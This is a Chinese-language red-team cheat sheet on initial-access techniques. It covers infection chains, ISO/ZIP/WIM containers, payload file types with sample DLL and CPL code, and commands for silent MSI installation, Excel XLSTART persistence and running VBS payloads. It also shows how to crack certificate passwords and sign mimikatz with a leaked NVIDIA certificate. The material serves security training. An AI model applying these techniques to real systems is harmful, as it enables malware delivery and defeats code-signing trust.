# 初始访问 (Initial Access)

> 在红队演练 (Red Team exercise) 的背景下，初始访问文件是指红队用于初步渗透目标系统或网络的各种文件、脚本、可执行文件或文档。这些文件通常包含恶意 payload，或者是为了利用特定漏洞而设计的，目的是在目标环境中建立立足点 (foothold)。

## 目录 (Summary)

* [复杂攻击链 (Complex Chains)](#complex-chains)
* [容器 (Container)](#container)
* [Payload](#payload)
    * [二进制文件 (Binary Files)](#binary-files)
    * [代码执行文件 (Code Execution Files)](#code-execution-files)
    * [嵌入式文件 (Embedded Files)](#embedded-files)
* [代码签名 (Code Signing)](#code-signing)

## 复杂攻击链 (Complex Chains)

> 投递 (容器 (触发器 + PAYLOAD + 诱饵))
> DELIVERY (CONTAINER (TRIGGER + PAYLOAD + DECOY))

* **投递 (DELIVERY)**：指投递一整包文件的方式
    * HTML 走私 (HTML Smuggling)、SVG 走私、附件
* **容器 (CONTAINER)**：捆绑所有感染依赖项的归档文件
    * ISO/IMG、ZIP、WIM
* **触发器 (TRIGGER)**：运行 payload 的某种方式
    * LNK、CHM、ClickOnce 应用程序
* **PAYLOAD**：恶意软件
    * 二进制文件
    * 代码执行文件
    * 嵌入式文件
* **诱饵 (DECOY)**：在引爆（运行）恶意软件后，用于继续进行背景铺垫的文件
    * 通常是打开 PDF 文件

示例：

* HTML 走私 (加密 ZIP + ISO (LNK + IcedID + PNG))，由 [TA551/Storm-0303](https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/) 使用。

## 容器 (Container)

* **ISO/IMG** - 可以包含隐藏文件，会被**自动挂载 (automounted)**，从而轻松访问包含的文件 (`powershell –c .\malware.exe`)。
* **ZIP** - 可以包含隐藏文件（定位 ZIP + 解压 + 切换目录 + 运行恶意软件）。
* **WIM** - Windows 映像 (Windows Image)，用于部署系统功能的内置格式。

    ```ps1
    # 挂载/卸载 .WIM
    PS> Mount-WindowsImage -ImagePath myarchive.wim -Path "C:\output\path\to\extract" -Index 1
    PS> Dismount-WindowsImage -Path "C:\output\path\to\extract" -Discard
    ```

* **7-zip, RAR, GZ** - 在 Windows 11 中应会获得原生支持。

## 触发器 (Trigger)

* **LNK**
* **CHM**
* **ClickOnce**

## Payload

### 二进制文件 (Binary Files)

这些文件可以在系统上直接执行，无需任何第三方支持。

* **.exe** 文件：可执行文件，点击即可运行。
* **.dll** 文件：使用 `rundll32 main.dll,DllMain` 执行。

    ```c
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>

    extern "C" __declspec(dllexport)
    DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBox(NULL, "Hello world!", "Hello World!", NULL);
    return 0;
    }

    extern "C" __declspec(dllexport)
    BOOL APIENTRY DllMain(HMODULE hModule,
                        DWORD ul_reason_for_call,
                        LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);
        break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
    }
    ```

* **.cpl** 文件：与带有 `Cplapplet` 导出的 .dll 文件相同。

    ```c
    #include "stdafx.h"
    #include <Windows.h>

    extern "C" __declspec(dllexport) LONG Cplapplet(
        HWND hwndCpl,
        UINT msg,
        LPARAM lParam1,
        LPARAM lParam2
    )
    {
        MessageBoxA(NULL, "嘿，我现在是你的控制面板项了。", "控制面板", 0);
        return 1;
    }

    BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
                        )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            Cplapplet(NULL, NULL, NULL, NULL);
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    ```

### 代码执行文件 (Code Execution Files)

* 带有宏的 Word 文档 (.doc, .docm)
* Excel 库 (.xll)
* 启用宏的 Excel 加载项文件 (.xlam)

    ```ps1
    xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\Microsoft\Excel\XLSTART
    ```

* WSF 文件 (.wsf)
* MSI 安装程序 (.msi)

    ```ps1
    powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi 
    ```

* MSIX/APPX 应用包 (.msix, .appx)
* ClickOnce (.application, .vsto, .appref-ms)
* Powershell 脚本 (.ps1)
* Windows Script Host 脚本 (.wsh, .vbs)

    ```ps1
    cscript.exe payload.vbs
    wscript payload.vbs
    wscript /e:VBScript payload.txt
    ```

### 嵌入式文件 (Embedded Files)

* 带有嵌入文件的 ICS 日历邀请

## 代码签名 (Code Signing)

证书的状态可以是 **过期 (Expired)**、**吊销 (Revoked)**、**有效 (Valid)**。

许多证书在互联网上泄露并被攻击者重复使用。
其中一部分可以通过 VirusTotal 查询找到：`content:{02 01 03 30}@4 AND NOT tag:peexe`

2022 年，LAPSUS$ 声称对显卡和 AI 技术制造商 NVIDIA 的网络攻击负责。作为此次攻击的一部分，LAPSUS$ 据称窃取了 NVIDIA 的专有数据并威胁要将其泄露。该泄露内容包含：

* 证书可以受密码保护。使用 [pfx2john.py](https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba)

    ```ps1
    john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes
    ```

* 使用证书对二进制文件进行签名。

    ```ps1
    osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out generated/signed-mimikatz.exe -pass nv1d1aRules
    ```

* 以下文件可以使用证书进行签名：
    * 可执行文件：.exe, .dll, .ocx, .xll, .wll
    * 脚本：.vbs, .js, .ps1
    * 安装程序：.msi, .msix, .appx, .msixbundle, .appxbundle
    * 驱动程序：.sys
    * 压缩包：.cab
    * ClickOnce：.application, .manifest, .vsto

## 参考资料 (References)

* [Top 10 Payloads: Highlighting Notable and Trending Techniques - delivr.to](https://blog.delivr.to/delivr-tos-top-10-payloads-highlighting-notable-and-trending-techniques-fb5e9fdd9356)
* [Executing Code as a Control Panel Item through an Exported Cplapplet Function - @spotheplanet](https://www.ired.team/offensive-security/code-execution/executing-code-in-control-panel-item-through-an-exported-cplapplet-function)
* [Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon Youtube](https://youtu.be/CwNPP_Xfrts)
* [Desperate Infection Chains - Multi-Step Initial Access Strategies by Mariusz Banach - x33fcon PDF](https://binary-offensive.com/files/x33fcon%20-%20Desperate%20Infection%20Chains.pdf)
* [Red Macros Factory - https://binary-offensive.com/](https://binary-offensive.com/initial-access-framework)
